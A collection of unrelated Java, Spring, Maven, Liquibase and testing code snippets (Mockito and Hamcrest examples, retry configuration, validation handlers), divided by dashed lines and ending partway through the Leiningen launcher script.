
- changeSet:
    id: 3
    author: hombergs
    changes:
    - createTable:
        tableName: flight
        columns:
        - column:
            name: flight_number
            type: varchar(50)
            constraints:
              nullable: false
        - column:
            name: airline
            type: varchar(50)
            constraints:
              nullable: false


- changeSet:
    id: 4
    author: hombergs
    changes:
    - createTable:
        tableName: user
        columns:
        - column:
            name: id
            type: bigint
            autoIncrement: true
            constraints:
              primaryKey: true
              nullable: false
        - column:
            name: name
            type: varchar(50)
            constraints:
              nullable: false
        - column:
            name: email
            type: varchar(50)
            constraints:
              nullable: false
        - column:
            name: registration_date
            type: timestamp
            constraints:
              nullable: false

- changeSet:
    id: 5
    author: hombergs
    changes:
    - createSequence:
        sequenceName: hibernate_sequence
--------------------------------------------------------------------------------------------------------
Size.customer.firstName=First Name must be longer than {min} characters
Size.customer.lastName=Last Name must be longer than {min} characters
Size.customer.description=Description must be longer than {min} characters
Size.customer.branch=Branch must be longer than {min} characters

Min.customer.age=Age must be greater than {value}
Max.customer.age=Age must be less than {value}

BranchCode.customer.branch=Branch must start with {value}
--------------------------------------------------------------------------------------------------------
 <profiles>
        <profile>
            <id>securityOff</id>
            <properties>
                <surefire.security.argline />
            </properties>
            <build>
                <plugins>
                    <plugin>
                        <groupId>org.apache.maven.plugins</groupId>
                        <artifactId>maven-surefire-plugin</artifactId>
                        <configuration>
                            <excludes>
                                <exclude>**/SecurityManagerConfiguredTest.java</exclude>
                            </excludes>
                        </configuration>
                    </plugin>
                </plugins>
            </build>
        </profile>
        <profile>
            <id>sonar</id>
            <build>
                <plugins>
                    <plugin>
                        <groupId>org.apache.maven.plugins</groupId>
                        <artifactId>maven-surefire-plugin</artifactId>
                        <configuration>
                            <!-- disable parallel execution so that JaCoCo listener can properly work -->
                            <parallel>none</parallel>
                            <perCoreThreadCount>false</perCoreThreadCount>
                            <forkCount>1</forkCount>
                        </configuration>
                    </plugin>
                    <plugin>
                        <artifactId>maven-shade-plugin</artifactId>
                        <executions>
                            <execution>
                                <id>shade-archive</id>
                                <phase>none</phase>
                            </execution>
                        </executions>
                    </plugin>
                </plugins>
            </build>
        </profile>
    </profiles>

    <properties>
        <surefire.security.argline>-Djava.security.manager -Djava.security.policy=${project.build.directory}/test-classes/server.policy</surefire.security.argline>
    </properties>
--------------------------------------------------------------------------------------------------------
public static <K, V> Matcher<Map<K, V>> hasSize(final int size) {
    return new TypeSafeMatcher<Map<K, V>>() {
        @Override
        public boolean matchesSafely(Map<K, V> kvMap) {
            return kvMap.size() == size;
        }

        @Override
        public void describeTo(Description description) {
            description.appendText(" has ").appendValue(size).appendText(" key/value pairs");
        }
    };
}
--------------------------------------------------------------------------------------------------------
package com.tdd;
import static org.hamcrest.CoreMatchers.is;
import static org.junit.Assert.assertThat;
import static org.mockito.Mockito.*;
import org.junit.Before;
import org.junit.Test;
import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.MockitoAnnotations;
public class CustomerServiceTest {
    @Mock
    private CustomerDao daoMock;
    @InjectMocks
    private CustomerService service;
    @Before
    public void setUp() throws Exception {
        MockitoAnnotations.initMocks(this);
    }
     @Test
        public void testAddCustomer_returnsNewCustomer() {
            when(daoMock.save(any(Customer.class))).thenReturn(new Customer());
            Customer customer = new Customer();
            assertThat(service.addCustomer(customer), is(notNullValue()));
        }
    //Using Answer to set an id to the customer which is passed in as a parameter to the mock method.
    @Test
    public void testAddCustomer_returnsNewCustomerWithId() {
        when(daoMock.save(any(Customer.class))).thenAnswer(new Answer<Customer>() {
            @Override
            public Customer answer(InvocationOnMock invocation) throws Throwable {
                Object[] arguments = invocation.getArguments();
                if (arguments != null && arguments.length > 0 && arguments[0] != null){
                    Customer customer = (Customer) arguments[0];
                    customer.setId(1);
                    return customer;
                }
                return null;
            }
        });
        Customer customer = new Customer();
        assertThat(service.addCustomer(customer), is(notNullValue()));
    }
    //Throwing an exception from the mocked method
     @Test(expected = RuntimeException.class)
        public void testAddCustomer_throwsException() {
            when(daoMock.save(any(Customer.class))).thenThrow(RuntimeException.class);
            Customer customer = new Customer();
            service.addCustomer(customer);//
        }
}
--------------------------------------------------------------------------------------------------------
@Test
    public void testUpdate() {
        doAnswer(new Answer<Void>() {
            @Override
            public Void answer(InvocationOnMock invocation) throws Throwable {
                Object[] arguments = invocation.getArguments();
                if (arguments != null && arguments.length > 1 && arguments[0] != null && arguments[1] != null) {
                    Customer customer = (Customer) arguments[0];
                    String email = (String) arguments[1];
                    customer.setEmail(email);
                }
                return null;
            }
        }).when(daoMock).updateEmail(any(Customer.class), any(String.class));
        // calling the method under test
        Customer customer = service.changeEmail("old@test.com", "new@test.com");
        //some asserts
        assertThat(customer, is(notNullValue()));
        assertThat(customer.getEmail(), is(equalTo("new@test.com")));
    }
    @Test(expected = RuntimeException.class)
    public void testUpdate_throwsException() {
        doThrow(RuntimeException.class).when(daoMock).updateEmail(any(Customer.class), any(String.class));
        // calling the method under test
        Customer customer = service.changeEmail("old@test.com", "new@test.com");
    }
}
--------------------------------------------------------------------------------------------------------
package com.tdd;
import static org.hamcrest.CoreMatchers.is;
import static org.junit.Assert.assertThat;
import static org.mockito.Mockito.*;
import org.junit.Before;
import org.junit.Test;
import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.MockitoAnnotations;
public class CustomerServiceTest {
    @Mock
    private CustomerDao daoMock;
    @InjectMocks
    private CustomerService service;
    @Before
    public void setUp() throws Exception {
        MockitoAnnotations.initMocks(this);
    }
    @Test
    public void test() {
        when(daoMock.save(any(Customer.class))).thenReturn(true);
        Customer customer=new Customer();
        assertThat(service.addCustomer(customer), is(true));
        //verify that the save method has been invoked
        verify(daoMock).save(any(Customer.class));
        //the above is similar to :  verify(daoMock, times(1)).save(any(Customer.class));
        //verify that the exists method is invoked one time
        verify(daoMock, times(1)).exists(anyString());
        //verify that the delete method has never been  invoked
        verify(daoMock, never()).delete(any(Customer.class));
    }
}
--------------------------------------------------------------------------------------------------------
package com.service;
import static org.hamcrest.CoreMatchers.*;
import static org.junit.Assert.assertThat;
import static org.mockito.Mockito.verify;
import org.junit.Test;
import org.mockito.ArgumentCaptor;
import org.mockito.Captor;
import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.MockitoAnnotations;
import com.dao.CustomerDao;
import com.entity.Customer;
public class CustomerServiceTest {
    @Mock
    private CustomerDao doaMock;
    @InjectMocks
    private CustomerService service;
    @Captor
    private ArgumentCaptor<Customer> customerArgument;
    public CustomerServiceTest() {
        MockitoAnnotations.initMocks(this);
    }
    @Test
    public void testRegister() {
        //Requirement: we want to register a new customer. Every new customer should be assigned a random token before saving in the database.
        service.register(new Customer());
        //captures the argument which was passed in to save method.
        verify(doaMock).save(customerArgument.capture());
        //make sure a token is assigned by the register method before saving.
        assertThat(customerArgument.getValue().getToken(), is(notNullValue()));
    }
}
--------------------------------------------------------------------------------------------------------
import static org.hamcrest.CoreMatchers.is;
import static org.junit.Assert.assertThat;
import static org.mockito.Mockito.*;
import org.junit.Before;
import org.junit.Test;
import org.mockito.InjectMocks;
import org.mockito.MockitoAnnotations;
import org.mockito.Spy;
public class CustomerServiceTestV2 {
    @Spy
    private CustomerDaoImpl daoSpy;
    @InjectMocks
    private CustomerService service;
    @Before
    public void setUp() throws Exception {
        MockitoAnnotations.initMocks(this);
    }
    @Test
    public void test() {
        Customer customer = new Customer();
        assertThat(service.addCustomer(customer), is(false));
        verify(daoSpy).save(any(Customer.class));
        verify(daoSpy, times(1)).exists(anyString());
        verify(daoSpy, never()).delete(any(Customer.class));
    }
}
--------------------------------------------------------------------------------------------------------
package org.baeldung.hamcrest;

import org.junit.Test;

import java.util.*;

import static org.baeldung.hamcrest.IsPositiveInteger.isAPositiveInteger;
import static org.hamcrest.MatcherAssert.assertThat;
import static org.hamcrest.Matchers.*;
import static org.hamcrest.beans.HasProperty.hasProperty;
import static org.hamcrest.beans.HasPropertyWithValue.hasProperty;
import static org.hamcrest.beans.SamePropertyValuesAs.samePropertyValuesAs;
import static org.hamcrest.collection.IsArrayContaining.hasItemInArray;
import static org.hamcrest.collection.IsArrayContainingInAnyOrder.arrayContainingInAnyOrder;
import static org.hamcrest.collection.IsArrayContainingInOrder.arrayContaining;
import static org.hamcrest.collection.IsArrayWithSize.arrayWithSize;
import static org.hamcrest.collection.IsCollectionWithSize.hasSize;
import static org.hamcrest.collection.IsEmptyCollection.empty;
import static org.hamcrest.collection.IsIn.isIn;
import static org.hamcrest.collection.IsIn.isOneOf;
import static org.hamcrest.collection.IsIterableContainingInAnyOrder.containsInAnyOrder;
import static org.hamcrest.collection.IsIterableContainingInOrder.contains;
import static org.hamcrest.collection.IsMapContaining.hasEntry;
import static org.hamcrest.collection.IsMapContaining.hasKey;
import static org.hamcrest.collection.IsMapContaining.hasValue;
import static org.hamcrest.core.AllOf.allOf;
import static org.hamcrest.core.AnyOf.anyOf;
import static org.hamcrest.core.Every.everyItem;
import static org.hamcrest.core.Is.is;
import static org.hamcrest.core.IsInstanceOf.instanceOf;
import static org.hamcrest.core.IsNot.not;
import static org.hamcrest.core.IsNull.notNullValue;
import static org.hamcrest.core.IsSame.sameInstance;
import static org.hamcrest.core.StringContains.containsString;
import static org.hamcrest.core.StringEndsWith.endsWith;
import static org.hamcrest.core.StringStartsWith.startsWith;
import static org.hamcrest.object.HasToString.hasToString;
import static org.hamcrest.object.IsCompatibleType.typeCompatibleWith;
import static org.hamcrest.text.IsEmptyString.isEmptyOrNullString;
import static org.hamcrest.text.IsEmptyString.isEmptyString;
import static org.hamcrest.text.IsEqualIgnoringCase.equalToIgnoringCase;
import static org.hamcrest.text.IsEqualIgnoringWhiteSpace.equalToIgnoringWhiteSpace;
import static org.hamcrest.text.StringContainsInOrder.stringContainsInOrder;

public class HamcrestMatcherUnitTest {
	@Test
	public void given2Strings_whenEqual_thenCorrect() {
		String a = "foo";
		String b = "FOO";
		assertThat(a, equalToIgnoringCase(b));
	}

	@Test
	public void givenBean_whenHasValue_thenCorrect() {
		Person person = new Person("Baeldung", "New York");
		assertThat(person, hasProperty("name"));
	}

	@Test
	public void givenBean_whenHasCorrectValue_thenCorrect() {
		Person person = new Person("Baeldung", "New York");
		assertThat(person, hasProperty("address", equalTo("New York")));
	}

	@Test
	public void given2Beans_whenHavingSameValues_thenCorrect() {
		Person person1 = new Person("Baeldung", "New York");
		Person person2 = new Person("Baeldung", "New York");
		assertThat(person1, samePropertyValuesAs(person2));
	}

	@Test
	public void givenAList_whenChecksSize_thenCorrect() {
		List<String> hamcrestMatchers = Arrays.asList("collections", "beans",
				"text", "number");
		assertThat(hamcrestMatchers, hasSize(4));
	}

	@Test
	public void givenArray_whenChecksSize_thenCorrect() {
		String[] hamcrestMatchers = { "collections", "beans", "text", "number" };
		assertThat(hamcrestMatchers, arrayWithSize(4));
	}

	@Test
	public void givenAListAndValues_whenChecksListForGivenValues_thenCorrect() {
		List<String> hamcrestMatchers = Arrays.asList("collections", "beans",
				"text", "number");
		assertThat(hamcrestMatchers,
				containsInAnyOrder("beans", "text", "collections", "number"));
	}

	@Test
	public void givenAListAndValues_whenChecksListForGivenValuesWithOrder_thenCorrect() {
		List<String> hamcrestMatchers = Arrays.asList("collections", "beans",
				"text", "number");
		assertThat(hamcrestMatchers,
				contains("collections", "beans", "text", "number"));
	}

	@Test
	public void givenArrayAndValue_whenValueFoundInArray_thenCorrect() {
		String[] hamcrestMatchers = { "collections", "beans", "text", "number" };
		assertThat(hamcrestMatchers, hasItemInArray("text"));

	}

	@Test
	public void givenValueAndArray_whenValueIsOneOfArrayElements_thenCorrect() {
		String[] hamcrestMatchers = { "collections", "beans", "text", "number" };
		assertThat("text", isOneOf(hamcrestMatchers));

	}

	@Test
	public void givenArrayAndValues_whenValuesFoundInArray_thenCorrect() {
		String[] hamcrestMatchers = { "collections", "beans", "text", "number" };
		assertThat(
				hamcrestMatchers,
				arrayContainingInAnyOrder("beans", "collections", "number",
						"text"));

	}

	@Test
	public void givenArrayAndValues_whenValuesFoundInArrayInOrder_thenCorrect() {
		String[] hamcrestMatchers = { "collections", "beans", "text", "number" };
		assertThat(hamcrestMatchers,
				arrayContaining("collections", "beans", "text", "number"));

	}

	@Test
	public void givenCollection_whenEmpty_thenCorrect() {
		List<String> emptyList = new ArrayList<>();
		assertThat(emptyList, empty());

	}

	@Test
	public void givenValueAndArray_whenValueFoundInArray_thenCorrect() {
		String[] array = new String[] { "collections", "beans", "text",
				"number" };
		assertThat("beans", isIn(array));

	}

	@Test
	public void givenMapAndKey_whenKeyFoundInMap_thenCorrect() {
		Map<String, String> map = new HashMap<>();
		map.put("blogname", "baeldung");
		assertThat(map, hasKey("blogname"));
	}

	@Test
	public void givenMapAndEntry_whenEntryFoundInMap_thenCorrect() {
		Map<String, String> map = new HashMap<>();
		map.put("blogname", "baeldung");
		assertThat(map, hasEntry("blogname", "baeldung"));
	}

	@Test
	public void givenMapAndValue_whenValueFoundInMap_thenCorrect() {
		Map<String, String> map = new HashMap<>();
		map.put("blogname", "baeldung");
		assertThat(map, hasValue("baeldung"));
	}

	@Test
	public void givenString_whenEmpty_thenCorrect() {
		String str = "";
		assertThat(str, isEmptyString());
	}

	@Test
	public void givenString_whenEmptyOrNull_thenCorrect() {
		String str = null;
		assertThat(str, isEmptyOrNullString());
	}

	@Test
	public void given2Strings_whenEqualRegardlessWhiteSpace_thenCorrect() {
		String str1 = "text";
		String str2 = " text ";
		assertThat(str1, equalToIgnoringWhiteSpace(str2));
	}

	@Test
	public void givenString_whenContainsGivenSubstring_thenCorrect() {
		String str = "calligraphy";
		assertThat(str, stringContainsInOrder(Arrays.asList("call", "graph")));
	}

	@Test
	public void givenBean_whenToStringReturnsRequiredString_thenCorrect() {
		Person person = new Person("Barrack", "Washington");
		String str = person.toString();
		assertThat(person, hasToString(str));
	}

	@Test
	public void given2Classes_whenOneInheritsFromOther_thenCorrect() {
		assertThat(Cat.class, typeCompatibleWith(Animal.class));
	}

	
	@Test
	public void given2Strings_whenIsEqualRegardlessWhiteSpace_thenCorrect() {
		String str1 = "text";
		String str2 = " text ";
		assertThat(str1, is(equalToIgnoringWhiteSpace(str2)));
	}

	@Test
	public void given2Strings_whenIsNotEqualRegardlessWhiteSpace_thenCorrect() {
		String str1 = "text";
		String str2 = " texts ";
		assertThat(str1, not(equalToIgnoringWhiteSpace(str2)));
	}

	@Test
	public void given2Strings_whenNotEqual_thenCorrect() {
		String str1 = "text";
		String str2 = "texts";
		assertThat(str1, not(str2));
	}

	@Test
	public void given2Strings_whenIsEqual_thenCorrect() {
		String str1 = "text";
		String str2 = "text";
		assertThat(str1, is(str2));
	}

	@Test
	public void givenAStrings_whenContainsAnotherGivenString_thenCorrect() {
		String str1 = "calligraphy";
		String str2 = "call";
		assertThat(str1, containsString(str2));
	}

	@Test
	public void givenAString_whenEndsWithAnotherGivenString_thenCorrect() {
		String str1 = "calligraphy";
		String str2 = "phy";
		assertThat(str1, endsWith(str2));
	}

	@Test
	public void givenAString_whenStartsWithAnotherGivenString_thenCorrect() {
		String str1 = "calligraphy";
		String str2 = "call";
		assertThat(str1, startsWith(str2));
	}

	@Test
	public void given2Objects_whenSameInstance_thenCorrect() {
		Cat cat = new Cat();
		assertThat(cat, sameInstance(cat));
	}

	@Test
	public void givenAnObject_whenInstanceOfGivenClass_thenCorrect() {
		Cat cat = new Cat();
		assertThat(cat, instanceOf(Cat.class));
	}

	@Test
	public void givenList_whenEachElementGreaterThan0_thenCorrect() {
		List<Integer> list = Arrays.asList(1, 2, 3);
		int baseCase = 0;
		assertThat(list, everyItem(greaterThan(baseCase)));
	}

	@Test
	public void givenString_whenNotNull_thenCorrect() {
		String str = "notnull";
		assertThat(str, notNullValue());
	}

	@Test
	public void givenString_whenMeetsAnyOfGivenConditions_thenCorrect() {
		String str = "calligraphy";
		String start = "call";
		String end = "foo";
		assertThat(str, anyOf(startsWith(start), containsString(end)));
	}

	@Test
	public void givenString_whenMeetsAllOfGivenConditions_thenCorrect() {
		String str = "calligraphy";
		String start = "call";
		String end = "phy";
		assertThat(str, allOf(startsWith(start), endsWith(end)));
	}

	@Test
	public void givenInteger_whenAPositiveValue_thenCorrect() {
		int num = 1;
		assertThat(num, isAPositiveInteger());
	}

	@Test
	public void givenAnInteger_whenGreaterThan0_thenCorrect() {
		int num = 1;
		assertThat(num, greaterThan(0));
	}

	@Test
	public void givenAnInteger_whenGreaterThanOrEqTo5_thenCorrect() {
		int num = 5;
		assertThat(num, greaterThanOrEqualTo(5));
	}

	@Test
	public void givenAnInteger_whenLessThan0_thenCorrect() {
		int num = -1;
		assertThat(num, lessThan(0));
	}

	@Test
	public void givenAnInteger_whenLessThanOrEqTo5_thenCorrect() {
		assertThat(-1, lessThanOrEqualTo(5));
	}

	@Test
	public void givenADouble_whenCloseTo_thenCorrect() {
		assertThat(1.2, closeTo(1, 0.5));
	}
}
--------------------------------------------------------------------------------------------------------
@Configuration
@EnableRetry
@EnableAspectJAutoProxy
@ImportResource("classpath:/retryadvice.xml")
public class AppConfig { ... }
--------------------------------------------------------------------------------------------------------

import java.sql.Connection;
import java.sql.SQLException;

import javax.sql.DataSource;

import org.springframework.beans.BeansException;
import org.springframework.beans.factory.config.BeanPostProcessor;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.annotation.Bean;
import org.springframework.core.Ordered;
import org.springframework.core.annotation.Order;
import org.springframework.jdbc.datasource.AbstractDataSource;
import org.springframework.retry.annotation.Backoff;
import org.springframework.retry.annotation.EnableRetry;
import org.springframework.retry.annotation.Retryable;

@SpringBootApplication
@EnableRetry
public class DemoApplication {

    @Order(Ordered.HIGHEST_PRECEDENCE)
    private class RetryableDataSourceBeanPostProcessor implements BeanPostProcessor {
        @Override
        public Object postProcessBeforeInitialization(Object bean, String beanName)
                throws BeansException {
            if (bean instanceof DataSource) {
                bean = new RetryableDataSource((DataSource)bean);
            }
            return bean;
        }

        @Override
        public Object postProcessAfterInitialization(Object bean, String beanName)
                throws BeansException {
            return bean;
        }
    }

    public static void main(String[] args) {
        SpringApplication.run(DemoApplication.class, args);
    }

    @Bean
    public BeanPostProcessor dataSouceWrapper() {
        return new RetryableDataSourceBeanPostProcessor();
    }
}

class RetryableDataSource extends AbstractDataSource {

    private DataSource delegate;

    public RetryableDataSource(DataSource delegate) {
        this.delegate = delegate;
    }

    @Override
    @Retryable(maxAttempts=10, backoff=@Backoff(multiplier=2.3, maxDelay=30000))
    public Connection getConnection() throws SQLException {
        return delegate.getConnection();
    }

    @Override
    @Retryable(maxAttempts=10, backoff=@Backoff(multiplier=2.3, maxDelay=30000))
    public Connection getConnection(String username, String password)
            throws SQLException {
        return delegate.getConnection(username, password);
    }
}
--------------------------------------------------------------------------------------------------------
@ExceptionHandler(MethodArgumentNotValidException.class)
@ResponseBody
@ResponseStatus(HttpStatus.BAD_REQUEST)
public Map<String, String> validationExceptionCaught(
        MethodArgumentNotValidException e) {
    return Collections.singletonMap("message", messageSource.getMessage(
            e.getBindingResult().getFieldError().getDefaultMessage()));
}
 
/**
 * for debugging
 */
@ExceptionHandler(MethodArgumentTypeMismatchException.class)
@ResponseBody
@ResponseStatus(HttpStatus.BAD_REQUEST)
public Map<String, String> validationExceptionCaught(
        MethodArgumentTypeMismatchException e) {
    return Collections.singletonMap("message", e.getMessage());
}
 
@ExceptionHandler(ConstraintViolationException.class)
@ResponseBody
@ResponseStatus(HttpStatus.BAD_REQUEST)
public Map<String, String> validationExceptionCaught(
        ConstraintViolationException e) {
    return Collections.singletonMap("message",
            messageSource.getMessage(
                    e.getConstraintViolations().stream().findFirst()
                            .map(ConstraintViolation::getMessageTemplate)
                            .orElse(e.getMessage())));
}
--------------------------------------------------------------------------------------------------------
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE properties SYSTEM "http://java.sun.com/dtd/properties.dtd">
<properties>
    <entry key="app.name">test de regroupement de ressources invoquÃ© par {0}</entry>
</properties>
--------------------------------------------------------------------------------------------------------
   <scm>
      <connection>scm:svn:svn+ssh://janey@svn.java.net/hk2~svn/tags/osgi-resource-locator-1.0.1</connection>
      <developerConnection>scm:svn:svn+ssh://janey@svn.java.net/hk2~svn/tags/osgi-resource-locator-1.0.1</developerConnection>             
    </scm>
	
	   <!-- override distributionManagement from parent pom -->
    <distributionManagement>
        <!-- our internal staging repository, to be pushed to http://download.java.net/maven/glassfish/ -->
        <repository>            
            <uniqueVersion>false</uniqueVersion>
            <!-- the ID maps to ~/.m2/settings.xml, so don't change the ID -->
            <id>rator.sfbay</id>
            <url>dav:http://glassfish-maven-repository.us.oracle.com/maven/repositories/glassfish/</url>
        </repository>
    </distributionManagement>
--------------------------------------------------------------------------------------------------------
    <profiles>
        <profile>
            <id>jdk5</id>
            <activation>
                <activeByDefault>false</activeByDefault>
                <jdk>1.5</jdk>
            </activation>
            <dependencies>
                <dependency>
                    <groupId>javax.xml.stream</groupId>
                    <artifactId>stax-api</artifactId>
                    <scope>provided</scope>
                </dependency>
            </dependencies>
        </profile>
        <profile>
            <id>jdk8-</id>
            <activation>
                <jdk>(,1.8)</jdk>
                <activeByDefault>false</activeByDefault>
            </activation>
            <build>
                <plugins>
                    <plugin>
                          <groupId>org.apache.maven.plugins</groupId>
                          <artifactId>maven-compiler-plugin</artifactId>
                          <executions>
                                <execution>
                                    <id>default-testCompile</id>
                                    <configuration>
                                          <testExcludes>
                                              <testExclude>**/lambda/*</testExclude>
                                          </testExcludes>
                                    </configuration>
                                </execution>
                          </executions>
                    </plugin>
                </plugins>
            </build>
        </profile>
        <profile>
            <id>jdk8+</id>
            <activation>
                <jdk>[1.8,)</jdk>
                <activeByDefault>false</activeByDefault>
            </activation>
            <build>
                <plugins>
                    <plugin>
                          <groupId>org.apache.maven.plugins</groupId>
                          <artifactId>maven-compiler-plugin</artifactId>
                          <executions>
                                <execution>
                                    <id>default-testCompile</id>
                                    <configuration>
                                          <source>1.8</source>
                                          <target>1.8</target>
                                    </configuration>
                                </execution>
                          </executions>
                    </plugin>
                </plugins>
            </build>
        </profile>
    </profiles>
--------------------------------------------------------------------------------------------------------
fsutil hardlink list
--------------------------------------------------------------------------------------------------------
@SpringBootApplication
@ComponentScan(
    excludeFilters = {
        // Exclude the default message service
        @ComponentScan.Filter(type = FilterType.ASSIGNABLE_TYPE, value = DefaultMessageService.class),
        // Exclude the default boot application or it's
        // @ComponentScan will pull in the default message service
        @ComponentScan.Filter(type = FilterType.ASSIGNABLE_TYPE, value = IntegrationTestDemo.class)
    }
)
--------------------------------------------------------------------------------------------------------
<?php
/**
 * Check if a given string is a valid UUID
 * 
 * @param   string  $uuid   The string to check
 * @return  boolean
 */
function isValidUuid( $uuid ) {
    
    if (!is_string($uuid) || (preg_match('/^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/', $uuid) !== 1)) {
        return false;
    }
    return true;
}
--------------------------------------------------------------------------------------------------------
<dependencies>
    <!-- Other dependencies... -->
    <!-- Add dependency for Rest Assured (has to go before JUnit to work) -->
    <dependency>
        <groupId>io.rest-assured</groupId>
        <artifactId>rest-assured</artifactId>
        <version>3.0.6</version>
        <scope>test</scope>
    </dependency>
    <dependency>
        <groupId>junit</groupId>
        <artifactId>junit</artifactId>
        <version>4.10</version>
        <scope>test</scope>
    </dependency>
    <!-- Other dependencies... -->
</dependencies>

package Tests.GameTests;

import Tests.TestModel;
import com.github.fge.jsonschema.cfg.ValidationConfiguration;
import com.github.fge.jsonschema.main.JsonSchemaFactory;
import org.testng.annotations.Test;

import static com.github.fge.jsonschema.SchemaVersion.DRAFTV4;
import static io.restassured.RestAssured.when;
import static io.restassured.module.jsv.JsonSchemaValidator.matchesJsonSchemaInClasspath;

public class GameTest extends TestModel {

    @Test
    public void testGameSchema() {
        JsonSchemaFactory jsonSchemaFactory = JsonSchemaFactory.newBuilder().
            setValidationConfiguration(ValidationConfiguration.
            newBuilder().
            setDefaultVersion(DRAFTV4).freeze()).freeze();

        when().
            get("/games/114").
            then().
            assertThat().
            body(matchesJsonSchemaInClasspath("game_schema.json").
                    using(jsonSchemaFactory));
    }
}

@SpringBootApplication
@ComponentScan(
    excludeFilters = {
        // Exclude the default message service
        @ComponentScan.Filter(type = FilterType.ASSIGNABLE_TYPE, value = DefaultMessageService.class),
        // Exclude the default boot application or it's
        // @ComponentScan will pull in the default message service
        @ComponentScan.Filter(type = FilterType.ASSIGNABLE_TYPE, value = IntegrationTestDemo.class)
    }
)
public class TestConfig {

    @Bean
    // Define our own test message service
    MessageService mockMessageService() {
        return new MessageService() {
            @Override
            public String getMessage() {
                return "This is a test message";
            }
        };
    }
}

@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration(classes = {
 ... // any required Spring config
)
@WebAppConfiguration
public class RestControllerTest {

    @Autowired
    private WebApplicationContext context;

    private MockMvc mockMvc;

    @Before
    public void setup() {
        mockMvc = MockMvcBuilders.webAppContextSetup(context).build();
    }


    @Test
    public void getUserList() throws Exception {
        mockMvc.perform(get("/user"))
            .andExpect(status().isOk())
            .andExpect(content().contentType("application/json;charset=UTF-8")) 
            .andExpect(content().encoding("UTF-8"))
            .andExpect(jsonPath("$", hasSize(8)))
            .andExpect(jsonPath("$[0].id").exists())
            .andExpect(jsonPath("$[0].alias").exists())
            .andExpect(jsonPath("$[0].name").exists())
        );
    }
}
--------------------------------------------------------------------------------------------------------
import org.junit.*;
import org.junit.runner.*;
import org.springframework.beans.factory.annotation.*;
import org.springframework.boot.test.autoconfigure.json.*;
import org.springframework.boot.test.context.*;
import org.springframework.boot.test.json.*;
import org.springframework.test.context.junit4.*;

import static org.assertj.core.api.Assertions.*;

@RunWith(SpringRunner.class)
@JsonTest
public class MyJsonTests {

	@Autowired
	private JacksonTester<VehicleDetails> json;

	@Test
	public void testSerialize() throws Exception {
		VehicleDetails details = new VehicleDetails("Honda", "Civic");
		// Assert against a `.json` file in the same package as the test
		assertThat(this.json.write(details)).isEqualToJson("expected.json");
		// Or use JSON path based assertions
		assertThat(this.json.write(details)).hasJsonPathStringValue("@.make");
		assertThat(this.json.write(details)).extractingJsonPathStringValue("@.make")
				.isEqualTo("Honda");
	}

	@Test
	public void testDeserialize() throws Exception {
		String content = "{\"make\":\"Ford\",\"model\":\"Focus\"}";
		assertThat(this.json.parse(content))
				.isEqualTo(new VehicleDetails("Ford", "Focus"));
		assertThat(this.json.parseObject(content).getMake()).isEqualTo("Ford");
	}
}
--------------------------------------------------------------------------------------------------------
import org.junit.*;
import org.junit.runner.*;
import org.springframework.beans.factory.annotation.*;
import org.springframework.boot.test.autoconfigure.web.servlet.*;
import org.springframework.boot.test.mock.mockito.*;

import static org.assertj.core.api.Assertions.*;
import static org.mockito.BDDMockito.*;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;

@RunWith(SpringRunner.class)
@WebMvcTest(UserVehicleController.class)
public class MyControllerTests {

	@Autowired
	private MockMvc mvc;

	@MockBean
	private UserVehicleService userVehicleService;

	@Test
	public void testExample() throws Exception {
		given(this.userVehicleService.getVehicleDetails("sboot"))
				.willReturn(new VehicleDetails("Honda", "Civic"));
		this.mvc.perform(get("/sboot/vehicle").accept(MediaType.TEXT_PLAIN))
				.andExpect(status().isOk()).andExpect(content().string("Honda Civic"));
	}
}
--------------------------------------------------------------------------------------------------------
import com.gargoylesoftware.htmlunit.*;
import org.junit.*;
import org.junit.runner.*;
import org.springframework.beans.factory.annotation.*;
import org.springframework.boot.test.autoconfigure.web.servlet.*;
import org.springframework.boot.test.mock.mockito.*;

import static org.assertj.core.api.Assertions.*;
import static org.mockito.BDDMockito.*;

@RunWith(SpringRunner.class)
@WebMvcTest(UserVehicleController.class)
public class MyHtmlUnitTests {

	@Autowired
	private WebClient webClient;

	@MockBean
	private UserVehicleService userVehicleService;

	@Test
	public void testExample() throws Exception {
		given(this.userVehicleService.getVehicleDetails("sboot"))
				.willReturn(new VehicleDetails("Honda", "Civic"));
		HtmlPage page = this.webClient.getPage("/sboot/vehicle.html");
		assertThat(page.getBody().getTextContent()).isEqualTo("Honda Civic");
	}
}

@RunWith(SpringRunner.class)
@SpringBootTest(webEnvironment = WebEnvironment.RANDOM_PORT)
public class SampleWebClientTests {

	@Autowired
	private TestRestTemplate template;

	@Test
	public void testRequest() {
		HttpHeaders headers = this.template.getForEntity("/example", String.class).getHeaders();
		assertThat(headers.getLocation()).hasHost("other.example.com");
	}

	@TestConfiguration
	static class Config {

		@Bean
		public RestTemplateBuilder restTemplateBuilder() {
			return new RestTemplateBuilder().setConnectTimeout(Duration.ofSeconds(1))
					.setReadTimeout(Duration.ofSeconds(1));
		}
	}
}
--------------------------------------------------------------------------------------------------------
#!/usr/bin/env bash

# Ensure this file is executable via `chmod a+x lein`, then place it
# somewhere on your $PATH, like ~/bin. The rest of Leiningen will be
# installed upon first run into the ~/.lein/self-installs directory.

export LEIN_VERSION="2.6.1"

case $LEIN_VERSION in
    *SNAPSHOT) SNAPSHOT="YES" ;;
    *) SNAPSHOT="NO" ;;
esac

if [[ "$OSTYPE" == "cygwin" ]] || [[ "$OSTYPE" == "msys" ]]; then
    delimiter=";"
else
    delimiter=":"
fi

if [[ "$OSTYPE" == "cygwin" ]]; then
  cygwin=true
else
  cygwin=false
fi

function command_not_found {
    >&2 echo "Leiningen coundn't find $1 in your \$PATH ($PATH), which is required."
    exit 1
}

function make_native_path {
    # ensure we have native paths
    if $cygwin && [[ "$1"  == /* ]]; then
    echo -n "$(cygpath -wp "$1")"
    elif [[ "$OSTYPE" == "msys" && "$1"  == /?/* ]]; then
